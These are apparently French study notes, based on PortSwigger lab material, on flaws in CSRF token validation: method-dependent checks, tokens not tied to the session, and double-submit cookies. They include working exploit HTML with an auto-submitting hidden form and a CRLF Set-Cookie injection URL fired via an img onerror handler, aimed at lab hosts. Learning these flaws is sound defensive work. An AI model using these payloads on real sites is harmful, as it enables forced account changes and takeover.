
Un jeton CSRF est une valeur unique, secrète et imprévisible, générée par l'application côté serveur et partagée avec le client. Lorsqu'il émet une requête pour effectuer une action sensible, comme l'envoi d'un formulaire, le client doit inclure le jeton CSRF correct. Dans le cas contraire, le serveur refusera l'action demandée.

> Correctement implémentés, les jetons CSRF protègent contre les attaques CSRF en empêchant un attaquant de créer une requête valide pour le compte de la victime. Comme l'attaquant n'a aucun moyen de prédire la valeur correcte du jeton CSRF, il ne pourra pas l'inclure dans la requête malveillante.

# Défauts courants dans la validation des jetons CSRF

Les vulnérabilités CSRF surviennent généralement en raison d'une validation défectueuse des jetons CSRF

### 1. Validation of CSRF token depends on request method

(La validation du jeton CSRF dépend de la méthode de demande)

Certaines applications valident correctement le jeton lorsque la requête utilise la méthode POST, mais ignorent la validation lorsque la méthode GET est utilisée.

> Dans cette situation, l'attaquant peut passer à la méthode GET pour contourner la validation et lancer une attaque CSRF

> Si l’app vérifie le token **seulement** pour POST, un attaquant peut forcer une requête **GET** pour exécuter une action sans token.

```http
GET /email/change?email=pwned@evil-user.net 
HTTP/1.1 Host: vulnerable-website.com 
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```


### 2. Validation of CSRF token depends on token being present

(La validation du jeton CSRF dépend de la présence du jeton)

Certaines applications valident correctement le jeton lorsqu'il est présent, mais ignorent la validation si le jeton est omis.

> Dans cette situation, l'attaquant peut supprimer l'intégralité du paramètre contenant le jeton (pas seulement sa valeur) pour contourner la validation et lancer une attaque CSRF

> Si l’app **n’ouvre** la vérification que quand le paramètre token existe, un attaquant peut appeler l’endpoint **sans** ce paramètre (le supprimer) et contourner la protection.

```http
POST /email/change HTTP/1.1 Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 25 
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm 

email=pwned@evil-user.net
```


### 3. CSRF token is not tied to the user session

(Le jeton CSRF n'est pas lié à la session utilisateur)

Certaines applications ne vérifient pas que le jeton appartient à la même session que l'utilisateur à l'origine de la requête. Elles gèrent alors un pool global de jetons qu'elles ont émis et acceptent tout jeton qui y figure.

> Dans cette situation, l'attaquant peut se connecter à l'application en utilisant son propre compte, obtenir un jeton valide, puis transmettre ce jeton à l'utilisateur victime dans son attaque CSRF

> Si le token n’est **pas lié** à la session, un attaquant peut s’authentifier, récupérer un token valide et l’utiliser contre une victime.

> Cela peut arrive que le token n'es utiliser que une seule fois


### 4. CSRF token is tied to a non-session cookie

(Le jeton CSRF est lié à un cookie non-session)

Dans une variante de la vulnérabilité précédente, certaines applications associent le jeton CSRF à un cookie, mais pas à celui utilisé pour le suivi des sessions. Ce problème peut facilement se produire lorsqu'une application utilise deux infrastructures distinctes, l'une pour la gestion des sessions et l'autre pour la protection CSRF, qui ne sont pas intégrées

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

Cette situation est plus difficile à exploiter, mais reste vulnérable. **Si le site web présente un comportement permettant à un attaquant d'installer un cookie dans le navigateur de la victime, une attaque est possible.**

> L'attaquant peut se connecter à l'application avec son propre compte, obtenir un jeton valide et le cookie associé, exploiter le comportement d'installation de cookie pour installer son cookie dans le navigateur de la victime et lui transmettre son jeton lors de son attaque CSRF.

##### Explication plus simplet - Le contexte

Le jeton CSRF est censé protéger contre les attaques où un site malveillant force un utilisateur authentifié à effectuer une action.  
**Problème ici :** le token CSRF est stocké dans un **cookie séparé** qui **n’est pas lié à la session**.

Exemple :

```
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
```

- `session=...` → suivi de la session de l’utilisateur.    
- `csrfKey=...` → token CSRF, mais pas lié à cette session.

> **Conséquence :** le token CSRF peut être valide **même si ce n’est pas le token de l’utilisateur connecté**.

##### Comment un attaquant peut exploiter ça

1. L’attaquant se connecte à l’application avec **son propre compte** → il reçoit **un token CSRF valide** (`csrf`) associé à son cookie (`csrfKey`).

2. Il trouve un moyen d’**installer son cookie `csrfKey`** dans le navigateur de la victime (via un script, un sous-domaine vulnérable, etc...).

```
https://target.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

3. Quand la victime visite le site ou clique sur un lien malveillant, le navigateur envoie **le cookie de l’attaquant** + **le token de l’attaquant** → le serveur accepte la requête comme si c’était légitime.

> Résultat : la victime exécute des actions au nom de l’attaquant ou de son propre compte.

```html
<html>
  <body>
    <form action="https://0a5c00600452448e8309698600ef0014.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="dipeuaberthold&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="JcY9IeoWr308wemxpp0q3tAG3DdeKeFY" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a5c00600452448e8309698600ef0014.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=lZDYzsBCRJQnCeuVFAwSQaV3TnefT2jH%3b%20SameSite=None" onerror="document.forms[0].submit()">

  </body>
</html>
```

##### Conclusion

- Même si le token existe et semble “valide”, **il n’est pas associé à la bonne session**.
- Si un attaquant peut placer son cookie dans le navigateur de la victime, il peut **contourner la protection CSRF**.

### 5. CSRF token is simply duplicated in a cookie

(Le jeton CSRF est simplement dupliqué dans un cookie)

Dans une autre variante de la vulnérabilité précédente, certaines applications ne conservent aucun enregistrement côté serveur des jetons émis, mais dupliquent chaque jeton dans un cookie et un paramètre de requête. Lors de la validation de la requête suivante, l'application vérifie simplement que le jeton soumis dans le paramètre de requête correspond à la valeur soumise dans le cookie.

Cette défense, parfois appelée « double soumission », contre le CSRF est préconisée car elle est simple à mettre en œuvre et évite tout état côté serveur :

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

> Dans ce cas, l'attaquant peut à nouveau lancer une attaque CSRF si **le site web propose une fonctionnalité de paramétrage des cookies**. 
> 
> Dans ce cas, l'attaquant n'a pas besoin d'obtenir son propre jeton valide. Il lui suffit d'inventer un jeton (éventuellement au format requis, si celui-ci est vérifié), d'exploiter le comportement de paramétrage des cookies pour placer son cookie dans le navigateur de la victime et de lui transmettre son jeton lors de son attaque CSRF.

```http
<html>
  <body>
    <form action="https://0a2b009b043071d5811e673100630035.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@pwned.pwned" />
      <input type="hidden" name="csrf" value="2Rn2fU5X8B1OTIb5W2DmsUj6NMhwqiFR" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a2b009b043071d5811e673100630035.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=2Rn2fU5X8B1OTIb5W2DmsUj6NMhwqiFR%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

